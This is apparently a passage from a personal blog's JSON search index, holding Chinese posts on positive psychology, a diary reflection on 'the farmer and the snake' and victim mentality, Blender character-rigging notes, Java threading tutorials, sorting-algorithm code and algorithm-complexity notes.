“灵药”：一周4次半小时以上的运动、一周6次十五分钟的意念锻炼、每24小时睡8个小时、每天12个拥抱。精神与肉体是紧密相连的，想要进行心理治疗的前提就是一定要保持运动的习惯。运动不是像服了抗抑郁药，而是不运动像服了抑郁药。我们常常会把运动作为被放弃的第一个选择，但实际上最不应该放弃的就是运动，越缺少时间越应该去运动。它能使我们更充分利用学习时间，让我们变得平静，使身体处于自然状态。（冥想瑜伽尚未尝试，跳过。睡眠之重要不必再提，跳过。）触摸是先天本能的需要，拥抱能实际提高幸福感。人不可以缺少身体的触摸，此处可参考罗马尼亚孤儿院实验与恒河猴实验，无论是孩童还是成人，身体上的接触都十分重要。 亲密关系是最重要的人生课题。仅仅重点讨论情侣关系，是因为在很多方面，它具有代表性，它包括了其他关系中的许多东西。寻找合适的人与经营同样重要，任何偏向单边一方的观点都缺少了主观辩证。而一份感情最重要的便是积极主动，积极主动是一份力量，哪怕只是在于自己的相处中，拥有着如此信念也不会将偏激的观点安插到自己身上。人际关系中的关键也在于认识自己，明白自己的需要。对亲密关系的态度也是对自我的态度，我们从他人的眼中看见自己。对一个人深层本性的认识，同时也是对人类普遍人性的认识。爱是种能力，它不单只是一种极端的情绪，它是最浪漫的，也是最理性的。（内容太多，省略。） 自尊的发展是人生的基础。自尊是一种认为自己能够应对生活中的基本挑战和值得享受快乐的感觉，包含能力感与价值感。自尊不是靠空洞的心理强化就能够产生的，它必须依靠你在生活中实际地解决问题，从而达到的一种对自己的评价。自尊是呈成长出现的，依次是依赖型自尊、独立型自尊、无条件型自尊，主要区分在于价值感与能力感的来源是他人、还是自我，甚至就是不需要另外的客体来评价。这三种模型是渐成型模型，会同时存在，会以不同的程度并存。个人认为是否具备自尊可以判断一个碳基生命体是否为人的条件，起码它应该具备4点特质：原则、共情、学习、表达。 积极心理学是一种生活方式。是一种解决问题的方法，但万不可跳过精神分析与认知行为，就像是第三个包子。但从现在的情况来看，我的幸福水平并没有上升。但它会给你罗列成就幸福生活的必要事项，起码你能有可以下手的地方了。比起另外两个流派关注为什么生病，生病的情况是什么样的，积极心理学关注怎么才能更健康。这更是门实践课，那么到这里，以上就只是实践的一部分而已了。","categories":[{"name":"日记","slug":"日记","permalink":"https://yeyeyeyeto.github.io/categories/%E6%97%A5%E8%AE%B0/"}],"tags":[{"name":"心理","slug":"心理","permalink":"https://yeyeyeyeto.github.io/tags/%E5%BF%83%E7%90%86/"}]},{"title":"Blender动画教程 - 熊猫跳舞 - 课程笔记","slug":"blender/Blender动画教程 - 熊猫跳舞 - 课程笔记","date":"2024-06-15T16:08:08.000Z","updated":"2024-06-15T12:35:41.868Z","comments":true,"path":"Blender/2024-06-16-blender/Blender动画教程 - 熊猫跳舞 - 课程笔记.html","permalink":"https://yeyeyeyeto.github.io/Blender/2024-06-16-blender/Blender%E5%8A%A8%E7%94%BB%E6%95%99%E7%A8%8B%20-%20%E7%86%8A%E7%8C%AB%E8%B7%B3%E8%88%9E%20-%20%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0.html","excerpt":"","text":"1 绑定前预检查 缩放旋转检查：Ctrl+A应用全部变化 模型对称检查&amp;朝向检查：X轴对称，脚站在红线上，脸朝向-y 曲线检查 大小检查：最好符合实际高度 模型面数检查：面数不能太多也太少。不足可以进入编辑模式Ctrl+R添加 父子级检查 修改器检查 绑定前应用：镜像修改器、实体化修改器、布尔修改器；（会参与变形的修改器） 可保留：细分表面修改器、阵列修改器、倒角修改器 备份检查：在修改器应用前也最好备份一下 2 ARP绑定 选中绑定的主体 打开ARP菜单：智能绑定 - 全身 确定 在智能绑定中添加各个节点；不需要手指可以选择取消；添加之后go会自动添加骨骼 调整骨骼 - ok之后在第一个菜单选择与绑定匹配；自动切换为姿态模式 - 右侧小窗口 物体属性 - 视图显示 勾选显示在前面 将模型绑定在控制器：切换为物体模式 - 选中模型 再选择控制器 - ARP菜单 切换蒙皮 - 绑定菜单 绑定 3 FBX的导入和重映射 导入 - FBX文件 勾选 骨架 - 自动骨骼坐标系 FBX会影响帧率；输出设置中可更改帧输出 ARP菜单 重映射 - 源骨架 点击骨骼 再点击菜单的吸管 - 目标骨架 点击控制器 再点击吸管 - 自动缩放 - 构建骨骼列表； 选择hips骨骼 设置为根（告诉插件熊猫的屁股根骨骼是该骨骼） - 重新定义静止姿态 - 当前姿态 - 应用 - 重新定义 - 确定 - 重新定位 4 FBX文件获取（使用方式）AI动作捕捉工具 https://plask.ai/ https://www.rokoko.com/ AI动作生成工具 https://mootion.com/ 动作库 http://mixamo.com/ 5 动画基础自动插帧 动画插口左侧的小圆点，是一个实时打关键帧的功能；激活之后自动记录所有变化。 动画摄影表（动画标签中打开，一般与非线性动画搭配使用） 切换为动作编辑器模式，该模型下才能编辑和改名；下推 会移动到非线性动画编辑器里 非线性动画 被下推的动作会显示为小黄块；选择小黄块按TAB推回动画摄影表 右侧标签 - 外插：保持 保持最帧的状态；保持前进 最后一帧保持 右侧标签 - 混合：替换和合并；可以设置多个动画之间的搭配 6 动作捕捉的修补与清理 检查项目设置 将骨骼从FK模式转换为IK模式 ARP菜单 - 姿态模式 - 选择手上的小方块 - ARP 绑定主要特性 设置 - 右侧小齿轮 - 烘焙FK&gt;IK - 设定帧数 确定； 四肢都要设定FK&gt;IK（都是为了方便后续做动作的清理） 修补 展开动画摄影表 - 动作编辑器，非线性动画；下推 后就可以开始K动作快捷键K 抖动太厉害可以切换到曲线编辑器：选中两只脚 A全选所有帧数 - 关键帧 平滑 高斯平滑 - 拉一下 20%就可以了 调整ok就下推 烘焙调整好的动作 非线性编辑器 - 片段 烘焙动作 - 取消 仅选中的骨骼 它会把所有合并到一个到动作编辑器 可以将其他的动作流删掉了，需要保存可以TAB上推回动作编辑器，改名后添加小盾牌 动作捕捉文件是FK运动模式（大臂带动小臂 正向运动学），需要改为IK模式（反向移动学）。","categories":[{"name":"Blender","slug":"Blender","permalink":"https://yeyeyeyeto.github.io/categories/Blender/"}],"tags":[{"name":"角色绑定","slug":"角色绑定","permalink":"https://yeyeyeyeto.github.io/tags/%E8%A7%92%E8%89%B2%E7%BB%91%E5%AE%9A/"},{"name":"AI动作捕捉","slug":"AI动作捕捉","permalink":"https://yeyeyeyeto.github.io/tags/AI%E5%8A%A8%E4%BD%9C%E6%8D%95%E6%8D%89/"}]},{"title":"农夫与蛇","slug":"diary/农夫与蛇","date":"2023-11-25T21:02:00.000Z","updated":"2024-06-15T08:12:03.739Z","comments":true,"path":"日记/2023-11-26-diary/农夫与蛇.html","permalink":"https://yeyeyeyeto.github.io/%E6%97%A5%E8%AE%B0/2023-11-26-diary/%E5%86%9C%E5%A4%AB%E4%B8%8E%E8%9B%87.html","excerpt":"","text":"还在幼年时，第一次听农夫与蛇的故事，我的内心就有种特别的悸动。近日碰巧，他人和自己身边都发生了类似的案例。 那是一种很复杂的情绪，掺杂着愤怒、疑惑、不解，甚至带着点痛苦的酸味。 农夫临死前或许仍然也想不明白，“我不是帮了你了吗”。我也想得不太明白，假设简单地给蛇打上危险与邪恶的标签，那么在人类社会中都长得一个模样的众多人类中，为什么也会存在如动物般的冷血和恶劣呢？ 在我的亲身接触中，它们在自我认同上认知自己具有良好的品格。善良、道德、温柔，它们如此自述自我，可每每到具体的事件之中，高洁光亮的自我又竟淡然无存。有种用了更高级不同于普通大众世界观的美感。我猜想着，愚蠢或许是那个关键的因素。蠢到连对正常客观世界的认知都存在着扭曲，蠢在连一条清晰的逻辑链都画不出来。可它们又很聪明，它们总能赢，它们总能得到一个答案，一个自以为正确的答案。 但蠢这个因素非常难说，哪怕就逻辑回路来说，任何人都会存在某种正确，也会存在某种错误。而我在那么说着，也有那么几许可能，我就是那个蠢的人QAQ。所以需要再加个额外的因素，来判断什么是“正确”。此典故较多发生在人际关系中，那么人际关系中的双方或大家的利益，是一个个实实在在的好处，哪怕我们都是笨蛋，只要得到好处开心了，也不会在乎我们之间的谁对谁错。 所以愚蠢的表现为狭隘认知下只顾短期自我利益，损害他人利益并断送信誉的行为。实际上对于正常思维的人非常难以去想象甚至去回溯它们愚蠢的思维逻辑链到底是如何接通的，所以当我想书写点分析又不知不觉流露到单纯的情绪发泄上。 认知局限造成的愚蠢，非常经典的一个思维便是：受害者思维。只要心态够差，世界上就没有顺境。“受害者”其实是一种“儿童自我状态”，简单说就是巨婴，不具备主观能动性，不相信自己可以具备改变时局的能力。它们将一切降临在它们身上的事件，都认为是某种恶意或攻击。它们往往在成长过程中经常有被侵入的体验，身心边界不被尊重，很有可能并未拥有过自己能做决定的主观能动性。大概率，它们的养育者也同样是把问题归咎于外界的受害者。受害者们因事件引发的负面情绪，只会吸引来相同具有负面情绪的人，而相同的人又会强化受害者们的认知。它们制造了一个负面怪圈并深陷其中，慢慢这个环境变成一个生态圈，而它们自己就是其中的一部分。它的认知，对得起它的苦难。 受害者不解决问题，准确来说，是不重视自己的感受，等别人重视。将重视感受这个责任交给别人，别人没做好，自己便是受害者了。当把过错归咎在外界时，攻击时就不会有任何内疚感，因为内心没有冲突，它们是在理所当然地施虐。受害者的心理游戏是一种自我预言，它们掌控失败，它们永远失败，逃避责任和攻击外界是它们的最爱，那么做的最大好处就是可以不用去看见自己的需求。也许对于它们来说，比起感受需求从未被满足的匮乏感，还是永远失败更好受一些。 匮乏在每个人身上都有可能会发生，也许是因为客观因素，也许是因为特殊时期。匮乏状态下任何人都非常有可能做出自己本来也不希望的行为，这不是个人主观选择可以决定的。不论你天赋有多强、有多努力，也不管你心态有多好、有多么自律，一旦陷入金钱、认知和价值观的短缺，那必然会导致心力的匮乏，而人生也在面临枯萎。要对匮乏中的人抱有理解和谨慎，那是不得不如此，不必远离，但要有心理准备。 在此也发现偏执型人格也似乎与受害者思维有诸多相似；也察觉到大抵同样习得性无助存在受害者身上。这几乎是非常经典的巨婴特质，是成长中的缺失。 嗯其实实际上我真正想要解决的是如何让自己避免再度遇到这样的情况。因为过满的助人性，总爱多管闲事，时常也有那么一些不太值得帮助的人。这或许是我的过失，我虽然也从低谷里爬出，但我却总自以为积极成长的人生应该是人人都想要的。或许它们只是想要在底下在恢复点能量，是时机不对，但这都无关要紧。要在保护好自己的情况下，再考虑救援的事情。要认清人类存在着多样性这一特点，有部分人群就只是单单实现这个功能的NPC。碰见它们只是概率问题，无论你存在与否，它们会平等地恶心遇见它们的每一个人。 抛开那些乱七八糟的问题，再从另外一个方面看，这也说明我说服力的低下。常常会考虑他人的感受，便会相当曲折地去指出缺点，甚至是思考到了底层逻辑。等到说出口的时候，软绵绵又让人听不懂。能听得懂的人不用说服，需要说服的人又听不进去。这恰恰是表明说服技能还不够。实际上没有人能被真正的说服，说服本质上是提醒对方本来就知道只不过暂时忘记了的事情，所以常常来说，我只能说服同等认知的人。而对于认知于我之下，我只能看出对方的低下，却无法考虑到并切换到对方的水平。","categories":[{"name":"日记","slug":"日记","permalink":"https://yeyeyeyeto.github.io/categories/%E6%97%A5%E8%AE%B0/"}],"tags":[{"name":"认知","slug":"认知","permalink":"https://yeyeyeyeto.github.io/tags/%E8%AE%A4%E7%9F%A5/"},{"name":"受害者","slug":"受害者","permalink":"https://yeyeyeyeto.github.io/tags/%E5%8F%97%E5%AE%B3%E8%80%85/"}]},{"title":"线程基础","slug":"program/线程基础","date":"2022-06-30T13:02:00.000Z","updated":"2024-06-15T11:30:12.997Z","comments":true,"path":"Java/2022-06-30-program/线程基础.html","permalink":"https://yeyeyeyeto.github.io/Java/2022-06-30-program/%E7%BA%BF%E7%A8%8B%E5%9F%BA%E7%A1%80.html","excerpt":"","text":"01 线程简介程序是指令和数据的有序集合，其本身没有任何运行的含义，是一个静态的概念。 进程则是执行程序的一次执行过程，它是一个动态的概念。 是系统资源分配的单通常在一个进程中可以包含若干个线程，当然一个进程中至少有一 个线程，不然没有存在的意义。 线程是CPU调度和执行的的单位。 注意：很多多线程是模拟出来的，真正的多线程是指有多个cpu，即多核，如服务器。如果是模拟出来的多线程，即在一个cpu的情况下， 在同一个时间点，cpu只能执行一个代码，因为切换的很快，所以就有同时执行的错局。 ![[Pasted image 20220617171043.png]] 1.1 核心概念 线程就是独立的执行路径; 在程序运行时，即使没有自己创建线程，后台也会有多个线程，如主线程, gc线程; main()称之为主线程，为系统的入口，用于执行整个程序; 在一个进程中，如果开辟了多个线程，线程的运行由调度器安排调度,调度器是与操作系统紧密相关的，先后顺序是不能认为的干预的。 对同一份资源操作时，会存在资源抢夺的问题，需要加入并发控制; 线程会带来额外的开销,如cpu调度时间，并发控制开销。 每个线程在自己的工作内存交互，内存控制不当会造成数据不一致 02 线程创建2.1 继承Thread子类继承Thread类具备多线程能力 启动线程：子类对象.start() 不建议使用：避免OOP单继承局限性 123456789101112131415161718192021222324// 创建线程方式一：继承Thread类，重写run()方法，调用start开启线程 // 线程开启不一定立即执行， 由CPU调度执行 public class ThreadTest1 extends Thread &#123; @Override public void run() &#123; // run方法线程体 for (int i = 0; i &lt; 20; i++) &#123; System.out.println(&quot;在看代码 --- &quot; + i); &#125; &#125; public static void main(String[] args) &#123; // main线程，主线程 // 创建一个线程对象 ThreadTest1 threadTest1 = new ThreadTest1(); // 调用start()方法开启线程 threadTest1.start(); for (int i = 0; i &lt; 2000; i++) &#123; System.out.println(&quot;学习 --- &quot; + i); &#125; &#125; &#125; 2.2 实现Runnable接口实现接口Runnable具有多线程能力 启动线程：传入目标对象 + Thread对象.start() 推荐使用：避免单继承局限性，灵活方便，方便同一个对象被多个线程使用 12345678910111213141516171819202122// 实现runnable接口，重写run方法，执行线程需要丢入runnable接口实现类，调用start方法 public class ThreadTest2 implements Runnable &#123; @Override public void run() &#123; // run方法线程体 for (int i = 0; i &lt; 20; i++) &#123; System.out.println(&quot;在看代码 --- &quot; + i); &#125; &#125; public static void main(String[] args) &#123; // 创建Runnable接口的实现类对象 ThreadTest2 threadTest2 = new ThreadTest2(); // 创建线程对象，通过线程对象来开启我们的线程，代理 new Thread(threadTest2).start(); for (int i = 0; i &lt; 2000; i++) &#123; System.out.println(&quot;学习 --- &quot; + i); &#125; &#125; &#125; 2.3实现Callable接口 实现Callable接口，需要返回值类型 重写call方法，需要抛出异常 创建目标对象 创建执行服务： 1ExecutorService ser = Executors.newFixedThreadPool(1); 提交执行： 1Future&lt;Boolean&gt; result1 = ser.submit(t1); 获取结果 1boolean r1 = result1.get(); 关闭服务 1ser.shutdownNow(); 03 线程状态![[Pasted image 20220620145615.png]]![[Pasted image 20220620145643.png]] setPriority(int newPriority)，更改线程优先级。static void sleep(long millis)，在指定的毫秒数内让当前正在执行的线程休眠。void join()，等待该线程终止。static void yield()，暂停当前正在执行的线程对象，并执行其他线程。void interrupt()，中断线程，别用这个方式。boolean isAlive()，测试线程是否处于活动状态。 3.1 线程停止不建议使用JDK提供的stop()、destroy()方法。【已废弃】推荐线程自己停止下来建议使用一个标志位进行终止变量但flag&#x3D;false，则终止线程运行。 123456789101112131415public class TestStop implements Runnable &#123; // 1. 线程中定义线程体使用的表示 private boolean flag = true; @Override public void run() &#123; // 2. 线程体使用该标识 while (flag) System.out.println(&quot;run... Thread&quot;); &#125; // 3. 对外提供方法改变标识 public void stop() &#123; this.flag = false; &#125;&#125; 3.2 线程休眠 sleep(时间) 指定当前线程阻塞的毫秒数 sleep存在异常InterruptedException sleep时间达到后线程进入就绪状态 sleep可以模拟网络延时，倒计时等 每一个对象都有一个锁，sleep不会释放锁 3.3 线程礼让 礼让线程，让当前正在执行的线程暂停，但不阻塞 将线程从运行状态转为就绪状态 让CPU重新调度，礼让不一定成功，看CPU心情 3.4 线程强制执行 Join合并线程，待此线程完成后，再执行其他线程，其他线程阻塞 可以想象成插队 1234567891011121314151617181920public class ThreadTest6 implements Runnable &#123; @Override public void run() &#123; for (int i = 0; i &lt; 100; i++) &#123; System.out.println(&quot;线程VIP来了&quot; + i); &#125; &#125; public static void main(String[] args) throws InterruptedException &#123; // 启动我们的线程 ThreadTest6 join = new ThreadTest6(); Thread thread = new Thread(join);; thread.start(); // 主线程 for (int i = 0; i &lt; 1000; i++) &#123; if (i == 200) thread.join(); System.out.println(&quot;main&quot; + i); &#125; &#125; &#125; 3.5 线程状态观测Thread.State 线程状态，线程可以处于以下状态之一： NEW，尚未启动的线程处于此状态。 RUNNABLE，在Java虚拟机中执行的线程处于此状态。 BLOCKED，被阻塞等待监视器锁定的线程处于此状态。 WAITING，正在等待另一个线程执行特定动作的线程处于此状态。 TIMED_WAITING，正在等待另一个线程执行动作达到指定等待时间的线程处于此状态 TERMINATED，已退出的线程处于此状态。 3.6 线程优先级 Java提供一个线程调度器来监控程序中启动后进入就绪状态的所有线程，线程调度器按照优先级决定应该调度哪个线程来执行。 线程的优先级用数字表示，范围从1~10 Thread.MIN_PRIORITY &#x3D; 1; Thread.MAX_PRIORITY &#x3D; 10; Thread.NORM_PRIORITY &#x3D; 5; 使用以下方式改变或获取优先级 getPriority() setPriority(int xxx) 优先级的设定建议在start()调度前 优先级低只是意味着获得调度的概率地，并不是优先级低就不会被调用，这都是看CPU的调度。 3. 7 守护线程 daemon 线程分为用户线程和守护线程 虚拟机必须确保用户线程执行完毕 虚拟机不用等待守护线程执行完毕 如：后台记录操作日志、监控内存、垃圾回收等待 04 线程同步4.1 并发并发：同一个对象被多个线程同时操作 例如：上万人同时抢票；一个账户两个银行地点同时取钱 处理多线程问题时，多个线程访问同一个对象，并且某些线程还想修改这个对象。这时候我们就需要线程同步，线程同步其实就是一种等待机制，多个需要同时访问此对象的线程进入这个对象的等待池形成队列，等待前面线程使用完毕，下一个线程再使用。（排队） 由于同一进程的多个线程共享同一快存储空间，在带来方便的同时，也带来了访问冲突问题，为了保证数据在方法中被访问时的正确性，在访问时加入锁机制 synchronized，当一个线程获得对象的排它锁，独占资源，其他线程必须等待，使用后释放锁即可，存在以下问题： 一个线程持有锁会导致其他所有需要此锁的线程挂起； 在多线程竞争下，加锁，释放锁会导致比较多的上下文切换和调度延时，引起性能问题； 如果一个优先级高的线程等待一个优先级低的线程释放锁 会导致优先级倒置，引起性能问题。 4.2 同步方法由于我们可以通过private关键字来保证数据对象只能被方法访问，所以我们只需要针对方法提出一套机制，这套机制就是synchronized关键字，它包括两种用法：synchronized方法和synchronized块。 12// 同步方法public synchronized void method(int args) &#123;&#125; synchronized方法控制对“对象”的访问，每个对象对应一把锁，每个synchronized方法都必须获得调用该方法的对象的锁才能执行，否则线程会阻塞，方法一旦执行，就独占该锁，直到该方法返回才释放锁，后门被阻塞的线程才能获得这个锁，继续执行。缺陷：若将一个大的方法声明为synchronized将会影响效率。 方法里面需要修改的内容才需要锁，锁得太多，浪费资源。 4.3 同步块同步块：synchronized(Obj) {} obj 称之为 同步监视器Obj 可以是任何对象，但是推荐使用共享资源作为同步监视器。同步方法中无需指定同步监视器，因为同步方法的同步监视器就是this，就是这个对象本身，或者class 同步监视器的执行过程 第一个线程访问，锁定同步监视器，执行其中代码。 第二个线程访问，发现同步监视器被锁定，无法访问。 第一个线程访问完毕，解锁同步监视器。 第二个线程访问，发现同步监视器没有锁，然后锁定并访问。 05 锁5.1 死锁多个线程各自占有一些共享资源，并且互相等待其他线程占有的资源才能运行，而导致两个或多个线程都在等待对方释放资源，都停止执行的情形，某一个同步块同时拥有“两个以上对象的锁”时，就可能会发生“死锁”的问题。 5.2 死锁避免方法产生死锁的四个必要条件： 互斥条件：一个资源每次只能被一个进程使用。 请求与保持条件：一个进程因请求资源而阻塞，对已获得的资源保持不妨。 不剥夺条件：进程已获得的资源，在未使用完之前，不能强行剥夺。 循环等待条件，若干进程之间形成一种头尾相接的循环等待资源关系。 上面列出了死锁的四个必要条件，我们只要想办法破了其中的任意一个或多个条件就可以避免死锁发生。 5.3 Lock从JDK 5.0开始，Java提供了更强大的线程同步机制 —— 通过显式定义同步锁对象来实现同步。同步锁使用Lock对象充当java.util.concurrent.locks.Lock接口是控制多个线程对共享资源进行访问的工具。锁提供了对共享资源的独占访问，每次只能有一个线程对Lock对象加锁，线程开始访问共享资源之前应先获得Lock对象。ReentrantLock类实现了Lock，它拥有与synchronized相同的并发性和内存语义，在实现线程安全的控制中，比较常用的是ReentrantLock, 可以显式加锁、释放锁。 1234567891011class A &#123; private final ReentrantLock lock = new ReenTrantLock(); public void m() &#123; lock.lock(); try&#123; // 保证线程安全的代码 &#125; finally &#123; lock.unlock; // 如果同步代码有异常，要将unlock写入finally语句块 &#125; &#125;&#125; 5.4 synchronized 与 Lock 的对比 Lock是显式锁（手动开启和关闭锁，别忘记关闭锁）synchronized是隐式锁， 出了作用域自动释放。 Lock只有代码块锁，synchronized有代码块锁和方法锁。 使用Lock锁，JVM将花费较少的时间来调度线程，性能更好。并且具有更好的扩展性(提供更多的子类) 优先使用顺序：Lock &gt; 同步代码块（已经进入了方法体，分配了相应资源） &gt; 同步方法（在方法体之外） 06 线程协作线程通信 - 生产者和消费者模式 假设仓库中只能存放一件产品，生产者将生产出来的产品放入仓库，消费者将仓库中产品取走消费。 如果仓库中没有产品，则生产者将产品放入仓库，否则停止生产并等待，直到仓库中的产品被消费者取走为止。 如果仓库中放有产品，则消费者可以将产品取走消费，否则停止消费并等待，直到仓库中再次放入产品为止。 线程通信 - 分析这是一个线程同步问题，生产者和消费者共享同一个资源，并且生产者和消费者之间相互依赖，互为条件。 对于生产者，没有生产产品之前，要通知消费者等待。而生产了产品之后，又需要马上通知消费者消费。 对于消费者，在消费之后，要通知生产者已经结束消费，需要生产新的产品以供消费。 在生产者消费者问题中，仅有synchronized是不够的 synchronized 可阻止并发更新同一个共享资源，实现了同步 synchronized 不能用来实现不同线程之间的消息传递(通信) Java提供了几个方法解决线程之间的通信问题 wait()，表示线程一直等待，直到其他线程通知，与sleep不同，会释放锁。 wait(long timeout)，指定等待的毫秒数 notify()，唤醒-个处于等待状态的线程 notifyAll()，唤醒同一个对象上所有调用wait()方法的线程，优先级别高的线程优先调度 均是Object类的方法，都只能在同步方法或者同步代码块中使用，否则会抛出异常IllegalMonitorStateException 解决方式1 - 管程法并发协作模型“生产者 &#x2F; 消费者模式”–&gt;管程法 生产者：负责生产数据的模块(可能是方法,对象,线程,进程); 消费者：负责处理数据的模块(可能是方法,对象,线程,进程); 缓冲区：消费者不能直接使用生产者的数据,他们之间有个缓冲区生产者将生产好的数据放入缓冲区，消费者从缓冲区拿出数据 解决方式2 - 信号灯法并发协作模型“生产者 &#x2F; 消费者模式”–&gt;信号灯法 07 线程池 背景：经常创建和销毁、使用量特别大的资源，比如并发情况下的线程，对性能影响很大。 思路：提前创建好多个线程,放入线程池中，使用时直接获取，使用完放回池中。可以避免频繁创建销毁、实现重复利用。类似生活中的公共交通工具。 好处： 提高响应速度(减少了创建新线程的时间) 降低资源消耗(重复利用线程池中线程,不需要每次都创建) 便于线程管理(…) corePoolSize：核心池的大小 maximumPoolSize：最大线程数 keepAliveTime：线程没有任务时最多保持多长时间后会终止 JDK 5.0起提供了线程池相关API：ExecutorService和Executors ExecutorService：真正的线程池接口。常见子类ThreadPoolExecutor123void execute(Runnable command) // 执行任务/命令，没有返回值，一般用来执行Runnable&lt;T&gt; Future&lt;T&gt; submit(Callable&lt;T&gt; task) // 执行任务,有返回值, 一般又来执行Callablevoid shutdown() // 关闭连接池 Executors：工具类、线程池的工厂类，用于创建并返回不同类型的线程池","categories":[{"name":"Java","slug":"Java","permalink":"https://yeyeyeyeto.github.io/categories/Java/"}],"tags":[]},{"title":"排序算法","slug":"program/排序算法","date":"2022-06-17T15:36:31.000Z","updated":"2024-06-15T11:28:43.808Z","comments":true,"path":"算法/2022-06-17-program/排序算法.html","permalink":"https://yeyeyeyeto.github.io/%E7%AE%97%E6%B3%95/2022-06-17-program/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95.html","excerpt":"","text":"选择排序算法步骤 从头到位遍历一遍数组，找出最小的元素，放到最开始的位置。 下标++，将最开始的数排出排序，继续重复1直到所有元素排序完毕。 Java实现123456789101112public static void selectionSort(int[] arr) &#123; if (arr == null || arr.length &lt; 2) return; for (int i = 0; i &lt; arr.length - 1; i++) &#123; int minIndex = i; for (int j = i + 1; j &lt; arr.length; j++) &#123; minIndex = arr[j] &lt; arr[minIndex] ? j : minIndex; System.out.println(arr[minIndex]); &#125; swap(arr, i, minIndex); &#125; &#125; 冒泡排序算法步骤 比较相邻的两个数，大的向后移。 最后的数是当前组中最大的了。从头开始步骤1的循环，直至排序结束。 Java实现123456789public static void BubbleSort(int[] arr) &#123; if (arr == null || arr.length &lt; 2) return; for (int i = 1; i &lt; arr.length; i++) &#123; for (int j = 0; j &lt; arr.length - i; j++) &#123; if (arr[j] &gt; arr[j+1]) swap(arr, j, j+1); &#125; &#125; &#125; 插入排序算法步骤 将第一个元素看作有序序列，第二个至最后看作无序。 选择无序中第一个元素，一一与有序中元素比较，直到不符合条件就插入到当前对比的位置上。 有序+1，无序-1，循环。 Java实现12345678910public static void insertionSort(int[] arr) &#123; if (arr == null || arr.length &lt; 2) return; for (int i = 1; i &lt; arr.length; i++) &#123; for (int j = i; j &gt; 0 &amp;&amp; arr[j] &lt; arr[j-1]; j--) &#123; swap(arr, j, j - 1); &#125; &#125; &#125; 希尔排序希尔排序是改进的插入排序 算法步骤 选定一个间隔数，按照间隔数分组。 组内进行排序。 重新设置间隔数，重新再排序，循环。（间隔数至1时就是普通的插入排序） Java实现12345678910111213141516171819202122public static void shellSort(int[] arr) &#123; if (arr == null || arr.length &lt; 2) return; // 二分之一序列 for (int gap = arr.length &gt;&gt; 1; gap &gt; 0; gap /= 2) &#123; for (int i = gap; i &lt; arr.length; i++) &#123; for (int j = i; j &gt; gap - 1; j -= gap) &#123; if (arr[j] &lt; arr[j-gap]) swap(arr, j, j-gap); &#125; &#125; &#125; // knuth序列 int h = 1; while (h &lt;= arr.length / 3) h = h * 3 + 1; for (int gap = h; gap &gt; 0; gap = (gap - 1) / 3) &#123; for (int i = gap; i &lt; arr.length; i++) &#123; for (int j = i; j &gt; gap - 1; j -= gap) &#123; if (arr[j] &lt; arr[j-gap]) swap(arr, j, j-gap); &#125; &#125; &#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://yeyeyeyeto.github.io/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"时间与空间复杂度","slug":"program/时间与空间复杂度","date":"2022-06-17T13:55:25.000Z","updated":"2024-06-15T07:54:06.447Z","comments":true,"path":"算法/2022-06-17-program/时间与空间复杂度.html","permalink":"https://yeyeyeyeto.github.io/%E7%AE%97%E6%B3%95/2022-06-17-program/%E6%97%B6%E9%97%B4%E4%B8%8E%E7%A9%BA%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6.html","excerpt":"","text":"时间复杂度时间维度：是指执行当前算法所消耗的时间，我们通常用「时间复杂度」来描述。 大O「 大O符号表示法 」，即 T(n) &#x3D; O(f(n))。 其中 n 表示数据规模 ，O(f(n))表示运行算法所需要执行的指令数，和f(n)成正比。 常见的时间复杂度量级 常数阶O(1) 线性阶O(n) 平方阶O(n²) 对数阶O(logn) 线性对数阶O(nlogn) ![[Pasted image 20220114174550.png]] 递归算法的时间复杂度如果递归函数中，只进行一次递归调用，递归深度为depth；在每个递归的函数中，时间复杂度为T；则总体的时间复杂度为O(T * depth)。 归并排序 与 快速排序 都带有递归的思想，并且时间复杂度都是O(nlogn) ，但并不是有递归的函数就一定是 O(nlogn) 级别的。从递归中进行一次递归调用的复杂度分析、递归中进行多次递归调用的复杂度分析。 具体举例分析 最好、最坏情况时间复杂度最好、最坏情况时间复杂度指的是特殊情况下的时间复杂度。 当数组中第一个元素就是要找的 x 时，时间复杂度是 O(1)；而当最后一个元素才是 x 时，时间复杂度则是 O(n)。 最好情况时间复杂度就是在最理想情况下执行代码的时间复杂度，它的时间是最短的；最坏情况时间复杂度就是在最糟糕情况下执行代码的时间复杂度，它的时间是最长的。 平均情况时间复杂度最好、最坏时间复杂度反应的是极端条件下的复杂度，发生的概率不大，不能代表平均水平。那么为了更好的表示平均情况下的算法复杂度，就需要引入平均时间复杂度。 平均情况时间复杂度可用代码在所有可能情况下执行次数的加权平均值表示。 还是以 find 函数为例，从概率的角度看， x 在数组中每一个位置的可能性是相同的，为 1 &#x2F; n。那么，那么平均情况时间复杂度就可以用下面的方式计算： ((1 + 2 + … + n) &#x2F; n + n) &#x2F; 2 &#x3D; (3n + 1) &#x2F; 4 find 函数的平均时间复杂度为 O(n)。 123456789int find(int[] array, int n, int x) &#123; for ( int i = 0 ; i &lt; n; i++) &#123; if (array[i] == x) &#123; return i; break; &#125; &#125; return -1; &#125; 均摊复杂度分析一个相对比较耗时的操作，如果能保证它不会每次都被触发，那么这个相对比较耗时的操作，它所相应的时间是可以分摊到其它的操作中来的。 空间复杂度空间维度：是指执行当前算法需要占用多少内存空间，我们通常用「空间复杂度」来描述。 一个程序的空间复杂度是指运行完一个程序所需内存的大小。利用程序的空间复杂度，可以对程序的运行所需要的内存多少有个预先估计。一个程序执行时除了需要存储空间和存储本身所使用的指令、常数、变量和输入数据外，还需要一些对数据进行操作的工作单元和存储一些为现实计算所需信息的辅助空间。程序执行时所需存储空间包括以下两部分： 固定部分，这部分空间的大小与输入&#x2F;输出的数据的个数多少、数值无关。主要包括指令空间（即代码空间）、数据空间（常量、简单变量）等所占的空间。这部分属于静态空间。 可变空间，这部分空间的主要包括动态分配的空间，以及递归栈所需的空间等。这部分的空间大小与算法有关。 一个算法所需的存储空间用f(n)表示。S(n)&#x3D;O(f(n))，其中n为问题的规模，S(n)表示空间复杂度。 空间复杂度可以理解为除了原始序列大小的内存，在算法过程中用到的额外的存储空间。 平衡二叉树如果二叉树的是以红黑树等平衡二叉树实现的，则 n 个节点的二叉排序树的高度为 log2n+1 ，其查找效率为O(Log2n)，近似于折半查找。 